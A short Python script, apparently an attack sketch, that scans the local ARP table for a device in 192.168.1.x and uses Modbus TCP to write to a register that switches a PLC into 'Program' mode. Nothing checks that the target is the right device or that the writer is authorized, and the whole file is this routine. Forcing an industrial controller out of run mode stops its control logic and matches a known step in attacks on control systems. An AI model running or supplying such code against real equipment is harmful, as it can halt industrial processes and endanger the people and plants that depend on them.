import socket
import subprocess
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Use ARP scan to find devices on the network
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'dynamic' in line:
            ip = line.split()[0]
            # Check if the IP is in the expected range (e.g., 192.168.1.x)
            if ip.startswith('192.168.1.'):
                return ip
    return None

# Function to change the PLC operating mode to "Program"
def change_plc_mode_to_program(ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(ip)
        if not client.connect():
            print(f"Failed to connect to PLC at {ip}")
            return

        # Define the register address for changing the operating mode
        # This address may vary depending on the PLC model
        mode_register = 0x0000

        # Define the value for "Program" mode
        # This value may vary depending on the PLC model
        program_mode_value = 0x0001

        # Write the "Program" mode value to the register
        result = client.write_register(mode_register, program_mode_value)
        if result.isError():
            print(f"Failed to change PLC mode to Program at {ip}")
        else:
            print(f"Successfully changed PLC mode to Program at {ip}")

        # Close the connection
        client.close()
    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"Discovered PLC IP: {plc_ip}")
        # Change the PLC operating mode to "Program"
        change_plc_mode_to_program(plc_ip)
    else:
        print("Failed to discover PLC IP address")

if __name__ == "__main__":
    main()